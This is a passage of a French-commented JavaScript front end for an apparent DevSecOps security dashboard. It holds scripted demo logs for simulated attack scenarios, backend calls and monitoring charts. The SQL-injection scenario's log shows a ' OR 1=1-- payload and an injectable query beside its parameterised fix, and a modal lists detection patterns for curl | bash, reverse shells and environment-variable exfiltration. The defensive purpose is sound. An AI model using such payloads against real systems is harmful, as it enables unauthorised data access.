      {d:2800,stage:'AI',   cls:'i', text:'[AUDIT] tamper=DETECTED | action=BLOCK | MTTR=2min', c:'blue'},
      {d:3200,stage:'SYS',  cls:'s', text:'✓ Scénario 02 terminé — Backdoor neutralisé (−97%)', c:'green'},
    ]
  },
  3: {
    title: 'Injection SQL SAST + DAST',
    logs: [
      {d:0,   stage:'SYS',  cls:'i', text:'=== Scénario 03 : Injection SQL — SAST + DAST ===', c:'bright'},
      {d:400, stage:'SAST', cls:'a', text:'⚠ Semgrep : python.flask.security.injection.raw-query-from-http-params', c:'amber'},
      {d:600, stage:'SAST', cls:'a', text:'   app.py:42 — f"SELECT * FROM users WHERE name=\'{username}\'"', c:'amber'},
      {d:1000,stage:'DAST', cls:'i', text:'→ OWASP ZAP : scan actif sur http://zerotrust-target:5000', c:''},
      {d:1800,stage:'DAST', cls:'e', text:'✗ SQLi confirmée en runtime : /user?username=\' OR 1=1--', c:'red'},
      {d:2100,stage:'DAST', cls:'e', text:'✗ Payload réponse : 200 OK + données utilisateurs exposés', c:'red'},
      {d:2500,stage:'AI',   cls:'p', text:'→ Claude génère le correctif paramétrisé...', c:'purple'},
      {d:3400,stage:'AI',   cls:'s', text:'✓ Patch : cursor.execute("SELECT * FROM users WHERE name=?", (username,))', c:'green'},
      {d:3800,stage:'AI',   cls:'i', text:'[AUDIT] sqli=CONFIRMED | sast+dast=TRUE | MTTR=5min', c:'blue'},
      {d:4200,stage:'SYS',  cls:'s', text:'✓ Scénario 03 terminé — SQLi patchée (−83%)', c:'green'},
    ]
  },
  4: {
    title: 'Coupure Réseau — Fallback IA',
    logs: [
      {d:0,   stage:'SYS',  cls:'i', text:'=== Scénario 04 : Coupure Réseau — Fallback IA ===', c:'bright'},
      {d:400, stage:'AI',   cls:'i', text:'→ Appel Claude API (tentative 1/1)...', c:'purple'},
      {d:800, stage:'AI',   cls:'e', text:'✗ Claude API indisponible — ConnectionError : timeout', c:'red'},
      {d:1000,stage:'AI',   cls:'e', text:'✗ Réseau externe coupé — données sensibles ne sortent pas', c:'red'},
      {d:1400,stage:'AI',   cls:'a', text:'⚡ FALLBACK activé → Ollama local (Mistral 7B)', c:'amber'},
      {d:1700,stage:'AI',   cls:'i', text:'→ POST http://localhost:11434/api/generate (mistral:7b)', c:''},
      {d:2800,stage:'AI',   cls:'s', text:'✓ Ollama répond en 1.1s — données traitées 100% localement', c:'green'},
      {d:3100,stage:'AI',   cls:'i', text:'[AUDIT] provider=ollama | fallback=ACTIVATED | data=LOCAL | t<35s', c:'blue'},
      {d:3500,stage:'SYS',  cls:'s', text:'✓ Pipeline continue sans interruption — Zero Trust maintenu', c:'green'},
      {d:3800,stage:'SYS',  cls:'s', text:'✓ Scénario 04 terminé — Bascule en <35 sec', c:'green'},
    ]
  }
};

let scenarioRunning = false;

// ─── runScenario : logs visuels + vrai appel backend ─────────────────────────
async function runScenario(num) {
  if(scenarioRunning) return;
  const sc = SCENARIOS[num]; if(!sc) return;
  scenarioRunning = true;

  const statusEl = document.getElementById(`atk-${num}-status`);
  const btnEl    = document.querySelector(`#atk-${num} .atk-btn`);
  const atkLog   = document.getElementById('atkLog');

  if(statusEl) statusEl.innerHTML = '<span class="atk-dot running"></span>En cours…';
  if(btnEl)    { btnEl.className='atk-btn running'; btnEl.innerHTML='<i class="ti ti-loader-2 spin"></i> En cours…'; }
  if(atkLog)   atkLog.innerHTML = '';

  // Scénario 4 : déclenche aussi la simulation visuelle du fallback
  if(num===4 && !fallbackActive) setTimeout(simulateFallback, 1000);

  // Joue les logs visuels en parallèle (effet démo)
  sc.logs.forEach(l => {
    setTimeout(() => {
      if(atkLog) appendLogToTarget('atkLog', '–', l.stage, l.cls, l.text, l.c);
      appendLog('–', l.stage, l.cls, l.text, l.c);
    }, l.d);
  });

  // ── VRAI APPEL BACKEND ───────────────────────────────────────────────────
  try {
    const response = await fetch(SCENARIO_ROUTES[num], { method: 'POST' });
    const result   = await response.json();

    // Attend la fin des logs visuels avant d'afficher le résultat réel
    const totalDur = sc.logs[sc.logs.length-1].d + 800;
    setTimeout(() => {
      if(result.success) {
        const realMsg = getRealResult(num, result);
        const line = `✓ RÉSULTAT RÉEL : ${realMsg}`;
        if(atkLog) appendLogToTarget('atkLog', '–', 'SYS', 's', line, 'green');
        appendLog('–', 'SYS', 's', line, 'green');
        if(statusEl) statusEl.innerHTML = '<span class="atk-dot done"></span>Terminé ✓ (réel)';
      } else {
        const errLine = `✗ Backend : ${result.error || 'erreur inconnue'}`;
        if(atkLog) appendLogToTarget('atkLog', '–', 'SYS', 'e', errLine, 'red');
        appendLog('–', 'SYS', 'e', errLine, 'red');
        if(statusEl) statusEl.innerHTML = '<span class="atk-dot idle"></span>Erreur backend';
      }
      if(btnEl) { btnEl.className='atk-btn'; btnEl.innerHTML='<i class="ti ti-rotate-clockwise"></i> Rejouer'; }
      // Scénario 4 : restore le fallback visuel
      if(num===4 && fallbackActive) setTimeout(simulateFallback, 800);
      scenarioRunning = false;
      appendCursor();
    }, totalDur);

  } catch(e) {
    // Erreur réseau (Flask non joignable)
    const totalDur = sc.logs[sc.logs.length-1].d + 800;
    setTimeout(() => {
      const errLine = `✗ Erreur réseau : ${e.message} — vérifier que Flask tourne sur :8888`;
      if(atkLog) appendLogToTarget('atkLog', '–', 'SYS', 'e', errLine, 'red');
      appendLog('–', 'SYS', 'e', errLine, 'red');
      if(statusEl) statusEl.innerHTML = '<span class="atk-dot idle"></span>Erreur réseau';
      if(btnEl) { btnEl.className='atk-btn'; btnEl.innerHTML='<i class="ti ti-rotate-clockwise"></i> Rejouer'; }
      if(num===4 && fallbackActive) setTimeout(simulateFallback, 800);
      scenarioRunning = false;
      appendCursor();
    }, totalDur);
  }
}

// ─── Formate le résultat réel retourné par le backend ────────────────────────
function getRealResult(num, result) {
  if(num===1) return result.cve_found !== undefined
    ? `${result.cve_found} CVE(s) détectée(s) par Trivy` + (result.cves?.length ? ` — ${result.cves.map(c=>c.id).join(', ')}` : '')
    : 'Scan Trivy exécuté';
  if(num===2) return result.detected
    ? '🚨 Backdoor détectée par l\'agent Anti-Tamper !'
    : 'Aucune anomalie détectée (agent IA)';
  if(num===3) return result.sqli_detected
    ? `SQLi confirmée — ${result.findings} finding(s) Semgrep`
    : `${result.findings} finding(s) Semgrep (SQLi non détectée)`;
  if(num===4) return result.message || 'Agent fallback lancé';
  return JSON.stringify(result);
}

function runAllScenarios() {
  if(scenarioRunning) return;
  [1,2,3,4].forEach(n=>{
    const s=document.getElementById(`atk-${n}-status`);
    const b=document.querySelector(`#atk-${n} .atk-btn`);
    if(s) s.innerHTML='<span class="atk-dot idle"></span>En attente';
    if(b) { b.className='atk-btn'; b.innerHTML='<i class="ti ti-player-play"></i> Simuler'; }
  });
  const delays = [0, 5500, 11000, 17000];
  [1,2,3,4].forEach((n,i)=>setTimeout(()=>runScenario(n), delays[i]));
}

// ══════════════════════════════════════════════════════════════════════════════
// MONITORING
// ══════════════════════════════════════════════════════════════════════════════
let monitoringInit = false; let monCharts = {};
const CC = {critical:'#E8525A',high:'#F4A93A',medium:'#5C6EF8',low:'#3EC97A',purple:'#9B59B6',grid:'rgba(0,0,0,.06)',text:'#9198B0',bg:'rgba(240,242,250,.5)'};

async function fetchMonitoringData() {
  try {
    const [sR,hR,fR,stR]=await Promise.all([fetch('/api/security-score'),fetch('/api/history'),fetch('/api/findings'),fetch('/api/status')]);
    const score=await sR.json(),history=await hR.json(),findings=await fR.json(),status=await stR.json();
    renderSecurityScore(score);
    renderCveSeverityChart(status);
    renderFindingsByScanner(findings);
    renderScoreTrendChart(history);
    renderPipelineStats(history);
    const sb=document.getElementById('scoreBadge');
    if(sb&&score.score!==undefined) sb.textContent=score.score;
    const ms=document.getElementById('m-score'),msub=document.getElementById('m-score-sub');
    if(ms) ms.textContent=score.score!==undefined?score.score+'/100':'–';
    if(msub) msub.textContent=score.gate_passed?'Gate: PASS ✓':'Gate: BLOQUÉ ✗';
  } catch(e){console.error(e);}
}
function initMonitoringCharts() {
  const gCtx=document.getElementById('scoreGaugeChart')?.getContext('2d');
  if(gCtx) monCharts.gauge=new Chart(gCtx,{type:'doughnut',data:{datasets:[{data:[0,100],backgroundColor:[CC.medium,CC.bg],borderWidth:0,circumference:270,rotation:225}]},options:{responsive:true,maintainAspectRatio:true,cutout:'72%',plugins:{legend:{display:false},tooltip:{enabled:false}},animation:{duration:800,easing:'easeOutQuart'}}});
  const cCtx=document.getElementById('cveSeverityChart')?.getContext('2d');
  if(cCtx) monCharts.cve=new Chart(cCtx,{type:'doughnut',data:{labels:['Critical','High','Medium','Low'],datasets:[{data:[0,0,0,0],backgroundColor:[CC.critical,CC.high,CC.medium,CC.low],borderWidth:2,borderColor:'#F0F2FA'}]},options:{responsive:true,maintainAspectRatio:false,cutout:'60%',plugins:{legend:{position:'bottom',labels:{color:CC.text,font:{family:'Outfit',size:11},padding:12}}}}});
  const fCtx=document.getElementById('findingsByScanner')?.getContext('2d');
  if(fCtx) monCharts.findings=new Chart(fCtx,{type:'bar',data:{labels:['SAST','SCA','DAST'],datasets:[{label:'Critical',data:[0,0,0],backgroundColor:CC.critical,borderRadius:3},{label:'High',data:[0,0,0],backgroundColor:CC.high,borderRadius:3},{label:'Medium',data:[0,0,0],backgroundColor:CC.medium,borderRadius:3}]},options:{responsive:true,maintainAspectRatio:false,scales:{x:{stacked:true,ticks:{color:CC.text},grid:{display:false}},y:{stacked:true,ticks:{color:CC.text,precision:0},grid:{color:CC.grid}}},plugins:{legend:{position:'bottom',labels:{color:CC.text,font:{family:'Outfit',size:11},padding:12}}}}});
  const tCtx=document.getElementById('scoreTrendChart')?.getContext('2d');
  if(tCtx) monCharts.trend=new Chart(tCtx,{type:'line',data:{labels:[],datasets:[{label:'Score sécurité',data:[],borderColor:CC.medium,backgroundColor:'rgba(92,110,248,.1)',fill:true,tension:.35,pointBackgroundColor:CC.medium,pointRadius:5,yAxisID:'y'},{label:'CVE total',data:[],borderColor:CC.critical,backgroundColor:'transparent',fill:false,tension:.35,borderDash:[4,3],pointBackgroundColor:CC.critical,pointRadius:4,yAxisID:'y2'}]},options:{responsive:true,maintainAspectRatio:false,interaction:{mode:'index',intersect:false},scales:{x:{ticks:{color:CC.text},grid:{color:CC.grid}},y:{min:0,max:100,ticks:{color:CC.text,precision:0},grid:{color:CC.grid}},y2:{position:'right',min:0,ticks:{color:CC.critical,precision:0},grid:{display:false}}},plugins:{legend:{position:'bottom',labels:{color:CC.text,font:{family:'Outfit',size:11},padding:16}}}}});
}
function renderSecurityScore(d) {
  const score=d.score??0,grade=d.grade??'–',gate=d.gate_passed??false,p=d.penalties??{};
  const color=score>=90?CC.low:score>=75?CC.medium:score>=60?CC.high:CC.critical;
  if(monCharts.gauge){monCharts.gauge.data.datasets[0].data=[score,100-score];monCharts.gauge.data.datasets[0].backgroundColor=[color,CC.bg];monCharts.gauge.update();}
  const sv=document.getElementById('scoreValue'),sg=document.getElementById('scoreGrade');
  if(sv){sv.textContent=score;sv.style.color=color;}
  if(sg){sg.textContent=grade;sg.style.color=color;}
  const badge=document.getElementById('gateBadge'),icon=document.getElementById('gateIcon'),msg=document.getElementById('gateMsg');
  if(badge){badge.textContent=gate?'PASS':'BLOQUÉ';badge.className=gate?'gate-badge pass':'gate-badge fail';}
  if(icon) icon.className=gate?'ti ti-shield-check gate-icon pass':'ti ti-shield-x gate-icon fail';
  if(msg) msg.textContent=gate?`✓ Déploiement autorisé — score ${score}/100 ≥ 90`:`✗ Déploiement bloqué — score ${score}/100 < 90`;
  const sp=(id,n,m)=>{const a=document.getElementById(id),b=document.getElementById(id+'-t');if(a)a.textContent=n;if(b)b.textContent=n>0?`-${n*m}`:'0';};
  sp('pen-cve-crit',p.cve_critical??0,15);sp('pen-cve-high',p.cve_high??0,8);sp('pen-cve-med',p.cve_medium??0,3);
  sp('pen-sast-crit',p.sast_critical??0,10);sp('pen-sast-high',p.sast_high??0,5);
  sp('pen-dast-high',p.dast_high??0,8);sp('pen-dast-med',p.dast_medium??0,4);
}
function renderCveSeverityChart(s) {
  if(!monCharts.cve) return;
  const crit=s.cve_critical??0,high=s.cve_high??0,tot=s.cve_total??0;
  monCharts.cve.data.datasets[0].data=[crit,high,Math.max(0,tot-crit-high),0];monCharts.cve.update();
}
function renderFindingsByScanner(findings) {
  if(!monCharts.findings) return;
  const c={SAST:{critical:0,high:0,medium:0},SCA:{critical:0,high:0,medium:0},DAST:{critical:0,high:0,medium:0}};
  findings.forEach(f=>{const s=c[f.source];if(!s)return;if(f.severity==='critical')s.critical++;else if(f.severity==='high')s.high++;else s.medium++;});
  monCharts.findings.data.datasets[0].data=[c.SAST.critical,c.SCA.critical,c.DAST.critical];
  monCharts.findings.data.datasets[1].data=[c.SAST.high,c.SCA.high,c.DAST.high];
  monCharts.findings.data.datasets[2].data=[c.SAST.medium,c.SCA.medium,c.DAST.medium];
  monCharts.findings.update();
}
function renderScoreTrendChart(history) {
  if(!monCharts.trend||!history?.length) return;
  const sorted=[...history].reverse().slice(-12);
  monCharts.trend.data.labels=sorted.map(b=>`#${b.build_number}`);
  monCharts.trend.data.datasets[0].data=sorted.map(b=>b.security_score!==undefined?b.security_score:Math.max(0,100-(b.cve_critical??0)*15-(b.cve_high??0)*8-(b.sast_findings??0)*5-(b.zap_high??0)*8));
  monCharts.trend.data.datasets[1].data=sorted.map(b=>b.cve_total??0);
  monCharts.trend.update();
}
function renderPipelineStats(history) {
  const el=document.getElementById('pipelineStats'); if(!el||!history?.length) return;
  const total=history.length,succ=history.filter(b=>b.build_result==='SUCCESS').length;
  const avgMs=history.reduce((s,b)=>s+(b.duration_ms??0),0)/total;
  const lastScore=history[0]?.security_score;
  const avgScore=Math.round(history.reduce((s,b)=>s+(b.security_score??0),0)/total);
  const passCount=history.filter(b=>b.gate_passed).length;
  el.innerHTML=`
    <div class="stat-item"><div class="stat-value green">${succ}/${total}</div><div class="stat-label">Builds réussis</div></div>
    <div class="stat-item"><div class="stat-value blue">${Math.floor(avgMs/60000)}m${String(Math.round((avgMs%60000)/1000)).padStart(2,'0')}s</div><div class="stat-label">Durée moyenne</div></div>
    <div class="stat-item"><div class="stat-value amber">${Math.round(succ/total*100)}%</div><div class="stat-label">Taux succès</div></div>
    <div class="stat-item"><div class="stat-value" style="color:#5C6EF8">${lastScore??'–'}/100</div><div class="stat-label">Score dernier</div></div>
    <div class="stat-item"><div class="stat-value" style="color:#5C6EF8">${avgScore}/100</div><div class="stat-label">Score moyen</div></div>
    <div class="stat-item"><div class="stat-value ${passCount===total?'green':'amber'}">${passCount}/${total}</div><div class="stat-label">Gates réussies</div></div>`;
}

// ── Modal helpers ─────────────────────────────────────────────────────────────
function openModal(title, bodyHtml) {
  document.getElementById('modalTitle').textContent=title;
  document.getElementById('modalBody').innerHTML=bodyHtml;
  document.getElementById('modal-overlay').style.display='flex';
}
function closeModal() { document.getElementById('modal-overlay').style.display='none'; }

function showRemediation(evt) {
  if(evt?.currentTarget) { document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active')); evt.currentTarget.classList.add('active'); }
  openModal('🧠 Agent de Remédiation IA',`
    <div class="modal-section"><div class="modal-section-title">Provider actif</div>
    <div class="modal-row"><span>Modèle primaire</span><span class="modal-badge blue">claude-sonnet-4-5</span></div>
    <div class="modal-row"><span>Fallback</span><span class="modal-badge amber">Ollama Mistral 7B</span></div>
    <div class="modal-row"><span>Calls API</span><span>${document.getElementById('aiCalls')?.textContent||'–'}</span></div>
    <div class="modal-row"><span>Fallbacks activés</span><span>${document.getElementById('fallbackCount')?.textContent||'0'}</span></div></div>
    <div class="modal-section"><div class="modal-section-title">Fonctionnement</div>
    <p>L'agent analyse chaque finding et génère un <strong>patch de code contextualisé</strong>. En cas d'indisponibilité Claude, bascule automatique sur <strong>Ollama local (&lt;35s)</strong>.</p></div>
    <div class="modal-section"><div class="modal-section-title">Dernières remédiations</div>
    <div class="modal-row"><span>SQLi /user endpoint</span><span class="modal-badge green">✓ Patché</span></div>
    <div class="modal-row"><span>CVE Pillow 9.0.0</span><span class="modal-badge green">✓ Mis à jour</span></div>
    <div class="modal-row"><span>Flask debug=True</span><span class="modal-badge amber">En attente</span></div></div>`);
}
function showAntiTamper(evt) {
  if(evt?.currentTarget) { document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active')); evt.currentTarget.classList.add('active'); }
  openModal('🔒 Agent Anti-Tampering',`
    <div class="modal-section"><div class="modal-section-title">Intégrité du pipeline</div>
    <div class="modal-row"><span>Jenkinsfile</span><span class="modal-badge green">✓ Intègre</span></div>
    <div class="modal-row"><span>Scripts CI</span><span class="modal-badge green">✓ Intègres</span></div>
    <div class="modal-row"><span>Image Docker</span><span class="modal-badge green">✓ Signée (Cosign)</span></div>
    <div class="modal-row"><span>Dépendances</span><span class="modal-badge blue">Vérifiées</span></div></div>
    <div class="modal-section"><div class="modal-section-title">Patterns détectés</div>
    <p>Appels <code>curl/wget</code> non déclarés · Exfiltration de variables d'env · <code>curl | bash</code> · Reverse shells · Accès credentials non déclarés · Modifications système</p></div>
    <div class="modal-section"><div class="modal-section-title">Dernière vérification</div>
    <div class="modal-row"><span>Hash Jenkinsfile</span><span style="font-family:var(--mono);font-size:11px">b0c30ba…</span></div>
    <div class="modal-row"><span>Timestamp</span><span>${new Date().toLocaleString('fr-FR')}</span></div></div>`);
}
function showZeroTrust(evt) {
  if(evt?.currentTarget) { document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active')); evt.currentTarget.classList.add('active'); }
  openModal('🛡️ Politiques Zero Trust',`
    <div class="modal-section"><div class="modal-section-title">Principes appliqués</div>
    <div class="modal-row"><span>Never Trust, Always Verify</span><span class="modal-badge green">Actif</span></div>
    <div class="modal-row"><span>Least Privilege (non-root)</span><span class="modal-badge green">Actif</span></div>
    <div class="modal-row"><span>Image minimale (python:3.11-slim)</span><span class="modal-badge green">Actif</span></div>
    <div class="modal-row"><span>Signature Cosign</span><span class="modal-badge green">Actif</span></div>
    <div class="modal-row"><span>Fallback local (données)</span><span class="modal-badge green">Actif</span></div>
    <div class="modal-row"><span>Pipeline auto-vérifié</span><span class="modal-badge green">Actif</span></div></div>
    <div class="modal-section"><div class="modal-section-title">Security Gate</div>
    <p>Déploiement <strong>bloqué automatiquement</strong> si score &lt; 90/100. Chaque stage doit passer tous ses contrôles avant de continuer.</p></div>`);
}

// ── Utils ─────────────────────────────────────────────────────────────────────
function escHtml(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }